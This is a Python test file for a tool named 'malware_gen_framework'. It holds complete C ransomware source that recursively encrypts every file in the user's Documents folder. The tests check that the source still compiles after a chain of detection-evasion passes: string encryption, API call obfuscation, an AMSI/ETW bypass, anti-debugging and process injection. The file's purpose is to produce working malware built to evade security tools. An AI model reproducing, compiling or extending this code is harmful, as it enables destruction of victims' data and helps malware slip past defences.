"""Tier 2 integration tests — full evasion chain + compilation."""

import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from malware_gen_framework.evasion_passes import (
    _mutate_source,
    _encrypt_string_literals,
    _obfuscate_api_calls,
    _inject_amsi_etw_bypass,
    _inject_anti_debug,
    _inject_seh_in_main,
    _inject_process_injection,
)
from malware_gen_framework.code_analysis import _brace_deficit


RANSOMWARE_SOURCE = (
    '#include <windows.h>\n'
    '#include <wincrypt.h>\n'
    '#include <stdio.h>\n'
    '#include <string.h>\n'
    '#include <shlobj.h>\n'
    '\n'
    'static BOOL encrypt_file(const char *filepath) {\n'
    '    HANDLE hFile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0,\n'
    '                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n'
    '    if (hFile == INVALID_HANDLE_VALUE) return FALSE;\n'
    '    DWORD fileSize = GetFileSize(hFile, NULL);\n'
    '    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {\n'
    '        CloseHandle(hFile);\n'
    '        return FALSE;\n'
    '    }\n'
    '    BYTE *buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);\n'
    '    if (!buffer) { CloseHandle(hFile); return FALSE; }\n'
    '    DWORD bytesRead;\n'
    '    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);\n'
    '    HCRYPTPROV hProv;\n'
    '    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);\n'
    '    HCRYPTHASH hHash;\n'
    '    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);\n'
    '    const char *password = "encryption_key_for_testing";\n'
    '    CryptHashData(hHash, (BYTE*)password, strlen(password), 0);\n'
    '    HCRYPTKEY hKey;\n'
    '    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);\n'
    '    DWORD encLen = fileSize;\n'
    '    CryptEncrypt(hKey, 0, TRUE, 0, buffer, &encLen, fileSize + 32);\n'
    '    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);\n'
    '    WriteFile(hFile, buffer, encLen, &bytesRead, NULL);\n'
    '    CloseHandle(hFile);\n'
    '    HeapFree(GetProcessHeap(), 0, buffer);\n'
    '    CryptDestroyKey(hKey);\n'
    '    CryptDestroyHash(hHash);\n'
    '    CryptReleaseContext(hProv, 0);\n'
    '    return TRUE;\n'
    '}\n'
    '\n'
    'static void scan_and_encrypt(const char *dirpath) {\n'
    '    char searchPath[MAX_PATH];\n'
    '    snprintf(searchPath, MAX_PATH, "%s\\\\*", dirpath);\n'
    '    WIN32_FIND_DATAA fd;\n'
    '    HANDLE hFind = FindFirstFileA(searchPath, &fd);\n'
    '    if (hFind == INVALID_HANDLE_VALUE) return;\n'
    '    do {\n'
    '        if (fd.cFileName[0] == \'.\') continue;\n'
    '        char fullpath[MAX_PATH];\n'
    '        snprintf(fullpath, MAX_PATH, "%s\\\\%s", dirpath, fd.cFileName);\n'
    '        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n'
    '            scan_and_encrypt(fullpath);\n'
    '        } else {\n'
    '            encrypt_file(fullpath);\n'
    '        }\n'
    '    } while (FindNextFileA(hFind, &fd));\n'
    '    FindClose(hFind);\n'
    '}\n'
    '\n'
    'int main(int argc, char *argv[]) {\n'
    '    printf("Starting encryption process...\\n");\n'
    '    char userDir[MAX_PATH];\n'
    '    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userDir);\n'
    '    char docPath[MAX_PATH];\n'
    '    snprintf(docPath, MAX_PATH, "%s\\\\Documents", userDir);\n'
    '    scan_and_encrypt(docPath);\n'
    '    printf("Encryption complete.\\n");\n'
    '    return 0;\n'
    '}\n'
)


def _compile(source, tmpdir, extra_flags=None):
    """Helper: write source and compile with MinGW. Returns (returncode, stderr)."""
    src = Path(tmpdir) / "test.c"
    out = Path(tmpdir) / "test.exe"
    src.write_text(source)
    cmd = [
        "x86_64-w64-mingw32-gcc", "-O2", "-s", "-static",
        str(src), "-o", str(out),
        "-lws2_32", "-ladvapi32", "-liphlpapi", "-lcrypt32",
        "-lole32", "-lshell32", "-lshlwapi",
    ]
    if extra_flags:
        cmd.extend(extra_flags)
    ret = subprocess.run(cmd, capture_output=True, text=True)
    return ret.returncode, ret.stderr


def test_full_evasion_chain_compiles(mingw_available):
    """Apply ALL evasion passes in order, then compile — the critical integration test."""
    src = RANSOMWARE_SOURCE
    src = _mutate_source(src)
    src = _encrypt_string_literals(src)
    src = _obfuscate_api_calls(src)
    src = _inject_amsi_etw_bypass(src)
    src = _inject_anti_debug(src)
    src = _inject_seh_in_main(src)

    assert _brace_deficit(src) == 0, "Evasion chain broke brace balance"

    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"Full evasion chain failed compilation:\n{stderr}"


def test_encrypt_then_compile(mingw_available):
    """String encryption alone should produce compilable output."""
    src = _encrypt_string_literals(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"String encryption broke compilation:\n{stderr}"


def test_obfuscate_then_compile(mingw_available):
    """IAT obfuscation alone should produce compilable output."""
    src = _obfuscate_api_calls(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"IAT obfuscation broke compilation:\n{stderr}"


def test_seh_then_compile(mingw_available):
    """SEH injection alone should produce compilable output."""
    src = _inject_seh_in_main(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"SEH injection broke compilation:\n{stderr}"


def test_process_injection_then_compile(mingw_available):
    """Process injection alone should produce compilable output."""
    src = _inject_process_injection(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"Process injection broke compilation:\n{stderr}"


def test_anti_debug_then_compile(mingw_available):
    """Anti-debug alone should produce compilable output."""
    src = _inject_anti_debug(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"Anti-debug broke compilation:\n{stderr}"


def test_amsi_etw_then_compile(mingw_available):
    """AMSI/ETW bypass alone should produce compilable output."""
    src = _inject_amsi_etw_bypass(RANSOMWARE_SOURCE)
    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir)
        assert rc == 0, f"AMSI/ETW bypass broke compilation:\n{stderr}"


def test_evasion_chain_preserves_function_count(mingw_available):
    """The evasion chain should add functions, not lose any."""
    from malware_gen_framework.code_analysis import _brace_deficit

    src = RANSOMWARE_SOURCE
    original_count = src.count("static ") + src.count("int main")

    src = _encrypt_string_literals(src)
    src = _obfuscate_api_calls(src)
    src = _inject_amsi_etw_bypass(src)
    src = _inject_anti_debug(src)
    src = _inject_seh_in_main(src)

    # Should have at least as many functions as before (more due to injected helpers)
    new_func_indicators = src.count("static ") + src.count("int main") + src.count("DWORD WINAPI")
    assert new_func_indicators >= original_count


def test_existing_source_evasion_pipeline(mingw_available):
    """Apply evasion passes to the real malware_source.c and recompile."""
    src_path = Path(__file__).resolve().parent.parent / "results" / "malware_source.c"
    if not src_path.exists():
        pytest.skip("results/malware_source.c not found")

    src = src_path.read_text()
    src = _encrypt_string_literals(src)
    src = _obfuscate_api_calls(src)
    src = _inject_amsi_etw_bypass(src)
    src = _inject_anti_debug(src)

    with tempfile.TemporaryDirectory() as tmpdir:
        rc, stderr = _compile(src, tmpdir, ["-lmpr", "-lwininet"])
        assert rc == 0, f"Evasion pipeline on real source failed:\n{stderr}"
